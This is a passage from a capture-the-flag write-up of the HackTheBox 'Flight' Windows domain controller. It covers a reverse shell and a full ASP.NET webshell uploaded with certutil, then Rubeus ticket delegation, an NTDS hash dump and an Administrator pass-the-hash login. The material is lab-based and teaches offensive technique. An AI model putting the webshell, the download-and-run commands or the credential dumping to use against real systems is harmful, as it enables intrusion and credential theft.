And by being listening on the `443` port, we got a shell as `C.Bum`:

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.187] 55719
Windows PowerShell running as user C.Bum on G0
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
flight\c.bum
PS C:\Windows\system32> 
```

## Pivoting to defaultapppool

- - -

As the user C.Bum, we can write files in the `Web` share, but to know what we have to upload, we only need to `curl` the `Travel & Tour` page:

```zsh
❯ curl http://127.0.0.1:8000 -I
HTTP/1.1 200 OK
Content-Length: 45949
Content-Type: text/html
Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
Accept-Ranges: bytes
ETag: "03cf42dc9d5d31:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 13 May 2023 23:00:08 GMT
```

In this headers, we notice that the server is running on `ASP.NET`, so using an `.aspx` malicious file we could get `RCE` as the `defaultapppool` user:

Content of the `.aspx` file:
```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```

We will save this as `cmd.aspx`, but again, you can save it with the name you want.
Now, with your `python` web server running, you can download the `.aspx` file into the `C:\inetpub\development\` directory:

```zsh
PS C:\inetpub\development> certutil.exe -urlcache -f -split http://10.10.14.30/cmd.aspx
****  Online  ****
  0000  ...
  0578
CertUtil: -URLCache command completed successfully.
PS C:\inetpub\development> 
```

Now, if you enter the web on port `8000` and access to the `cmd.aspx` resource, we will get something like this:

![](/assets/img/flight/cmdaspx.png)

To gain access, we will run our `netcat` listener and execute the `cmd.exe` using the `cmd.aspx` on the web:

![](/assets/img/flight/7.png)

While executing this, we will get a shell as the `defaultapppool` user:

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.187] 55791
Windows PowerShell running as user G0$ on G0
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>
```

## Privilege Escalation

- - -

The idea for this part is that we can authenticate against the machine as the `defaultapppool` user, so if we intercept that request, we will obtain the `NTLMv2` hash of the machine.
This part is very cool and pretty tricky, so pay attention:

First, we will make a `smb` server, as always:

```zsh
❯ impacket-smbserver new . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, if the password is weak, we could exploit this with `net`, but in this case, the password is pretty strong:

```zsh
❯ impacket-smbserver new . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,55886)
[*] AUTHENTICATE_MESSAGE (flight\G0$,G0)
[*] User G0\G0$ authenticated successfully
[*] G0$::flight:aaaaaaaaaaaaaaaa:80fde84e065ccb48047e1f8625f1a1a9:0101000000000000805f89feb985d9011f08918639c7825a00000000010010004f005900450050007900740076004a00030010004f005900450050007900740076004a00020010007800550063007a00510069004a007700040010007800550063007a00510069004a00770007000800805f89feb985d90106000400020000000800300030000000000000000000000000300000cae9520d7ac0dbcc71d7ce369c0c73a3839397548f1e5e65eb9ce6be043e8b650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330030000000000000000000
[*] Closing down connection (10.10.11.187,55886)
[*] Remaining connections []
```

However, this `hash` is not crackeable. 
To keep exploiting, we will use `Rubeus.exe`:

```zsh
PS C:\temp> certutil.exe -urlcache -f -split http://10.10.14.30/Rubeus.exe
****  Online  ****
  000000  ...
  06d200
CertUtil: -URLCache command completed successfully.
PS C:\temp> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: Pb/LqtjPkJguT229PD3cO0ax3GlQXXokEwbOzujRtJs=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECtAwfUdh0NlNfSrtWnk3vtfTJHDsdBB15GMHnhQvY2O1dIYPuEyLnHzxUKZDRRI4WCrwvylkZy89aXSge9SmL77K6Jqpu17USUc6qDVJFf6F/I3/7iQw+T/WM3Mu3FnxqRo+U+yfpC6AOPEgRbD7qvjwp+JPMi3ssm0qzMb/cQ78+/HNXh6a3KiXaOjXw7UtqCcBNK8UWk4il1fkXU3en/gwBOROXV9oQp0PSglqBYZjwUI/IbriPYJPjf/sbtcooZjUV2rczfkVREcfYhLsNn/E4yHGnKtlsN0UWeNUQpJ3BpfqqXfmD8iYurwyyK++7Aof9NEmGG4tEcOQAgRpOp6jGbrLszwZ3O8MvZbA1mIUU5aduk6e0nIZtkM3phIzXApEEvCJdOhSO6Fgxce+K61HaSig/c1tCuHq2razVW3KJk1nsBxa27l3e4sdgCNAYtW/VJ8aZiebvgn/tayQFZUPgj48YLwQtqxOI0hdp3UAFOZg51MTZgQo7pf17RtHG3MbN0q4YlLlq/CSNqD7k3eO+FJ02NWeZ8AIr/2vvlOxyUTMbrv+lnjZsGa4V2Foj3eRDKtVsiwslwNlFNBinvQCpt6iaewNsAuaLzn9Ft4zvYvq9jj7X1vh39qkqzmezgkiFV1UaanW60RZCY9nhEkQBlf2GbeLP7AJXy3Kydg8xsfQ2SEvwqAG4NqEK3dd5FPhDPkcEUwHfBmiL273vBp2UmKmzsWlGHeBT7Zm7r/TASXxdhGj2m4NryT7SidBNhhKb7pSd170XjjokhLo9RZ5UWxx1iJ8bO5EdAli3QbGUM1RDOcbr6xZAVblVojTMilMWY16AOGqEsTzAFhjSqjLAawgu9UPu6jkF/sT96Ipa46zMOvyhTaVmubb7uDi9bi8F+YpY65GlJTsfSd/zYmOF70XWXmYsaCaKWed0AVOLjqFbA+nBlv+LYoWKWe9i7kCkhPez6zNbZn9NT4+BVIclEsijO/w9M3/E6OEWedFjGdWYWhIp7PQ3779eke3645t9plZfvaEhQcbonSBO25yNeGHiJ9xSfz/gLsfjd/ERBWNngqZTSwOlpKBIYC9Lw6N1fBJtigJ5Zr2mI0mfQqR5qI9T2OERYFkOD9dPae7Wf2JjkIwfjGkvZpDgfiI+BwjVOq03LwiwBcM+xWAhIkwX/UNQvVFZozz/SoVZYHcMelr1J7mso/EVwWLDYjAr5bqRXsEgmb0qdykycE8Xq7ykmVY6bKafgwuFn1vAn6g1D0a1B6zCy6okXz2M2EVicYkgJ6P6i8/UGdHjo84creVMPLPPFyZ8efJh7051ErpL7cwRt4mg6ffoxACtgOph+dczIv7iMNbpALvWqen2cEWzMf4W+IpOGDRo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgoFW9fmzrpJAoYfsn57WAzNcK5HLHU/71Da5ig9arbHehDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDIzMDUxMzIxMDgyOFqmERgPMjAyMzA1MTQwNzA4MjhapxEYDzIwMjMwNTIwMjEwODI4WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
PS C:\temp> 
```

Now, we will save the `base64` coded into a file called `kirbi.b64` and then, decode it into a file called `ticket.kirbi`:

```zsh
❯ base64 -d kirbi.b64 > ticket.kirbi
```

Now, we will use `impacket-ticketConverter` to convert the `ticket.kirbi` file into cache:

```zsh
❯ impacket-ticketConverter ticket.kirbi G0.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

Then, export the `kirbi` variable:

```zsh
❯ export KRB5CCNAME=G0.ccache
```

To avoid any problems with `kerberos`, I am going to synchronize the time:

```zsh
❯ ntpdate -s flight.htb
```

After that, we will check if the ticket is valid. For this, we will use `crackmapexec`, again:

```zsh
❯ cme smb g0.flight.htb -k --use-kcache 
SMB         g0.flight.htb   445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)  
SMB         g0.flight.htb   445    G0               [+] flight.htb\ from ccache
```

Perfect! Now, let's dump the `ntds.dit` to see the user's `hashes`:

```zsh
❯ cme smb g0.flight.htb -k --use-kcache --ntds drsuapi
SMB         g0.flight.htb   445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)  
SMB         g0.flight.htb   445    G0               [+] flight.htb\ from ccache 
SMB         g0.flight.htb   445    G0               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         g0.flight.htb   445    G0               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         g0.flight.htb   445    G0               Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
SMB         g0.flight.htb   445    G0               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         g0.flight.htb   445    G0               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::
SMB         g0.flight.htb   445    G0               S.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
SMB         g0.flight.htb   445    G0               R.Cold:1603:aad3b435b51404eeaad3b435b51404ee:5607f6eafc91b3506c622f70e7a77ce0:::
SMB         g0.flight.htb   445    G0               G.Lors:1604:aad3b435b51404eeaad3b435b51404ee:affa4975fc1019229a90067f1ff4af8d:::
SMB         g0.flight.htb   445    G0               L.Kein:1605:aad3b435b51404eeaad3b435b51404ee:4345fc90cb60ef29363a5f38e24413d5:::
SMB         g0.flight.htb   445    G0               M.Gold:1606:aad3b435b51404eeaad3b435b51404ee:78566aef5cd5d63acafdf7fed7a931ff:::
SMB         g0.flight.htb   445    G0               C.Bum:1607:aad3b435b51404eeaad3b435b51404ee:bc0359f62da42f8023fdde0949f4a359:::
SMB         g0.flight.htb   445    G0               W.Walker:1608:aad3b435b51404eeaad3b435b51404ee:ec52dceaec5a847af98c1f9de3e9b716:::
SMB         g0.flight.htb   445    G0               I.Francis:1609:aad3b435b51404eeaad3b435b51404ee:4344da689ee61b6fbbcdfa9303d324bc:::
SMB         g0.flight.htb   445    G0               D.Truff:1610:aad3b435b51404eeaad3b435b51404ee:b89f7c98ece6ca250a59a9f4c1533d44:::
SMB         g0.flight.htb   445    G0               V.Stevens:1611:aad3b435b51404eeaad3b435b51404ee:2a4836e3331ed290bd1c2fd2b50beb41:::
SMB         g0.flight.htb   445    G0               svc_apache:1612:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
SMB         g0.flight.htb   445    G0               O.Possum:1613:aad3b435b51404eeaad3b435b51404ee:68ec50916875888f44caff424cd3f8ac:::
SMB         g0.flight.htb   445    G0               G0$:1001:aad3b435b51404eeaad3b435b51404ee:140547f31f4dbb4599dc90ea84c27e6b::
```

NICE!! We have the Administrator's `hash`! Now, we can open `evil-winrm` and connect to the machine as `Administrator`:

```zsh
❯ evil-winrm -i 10.10.11.187 -u Administrator -H 43bbfc530bab76141b12c8446e30c17c

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
4***************************5
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

![](/assets/img/flight/pwned.png)

NICE!! Rooted machine!!

## Conclusions

- - -

I hope you've enjoyed this machine, and of course, that you've learned something. I will see you soon, as always it's me, take care,
Ruycr4ft.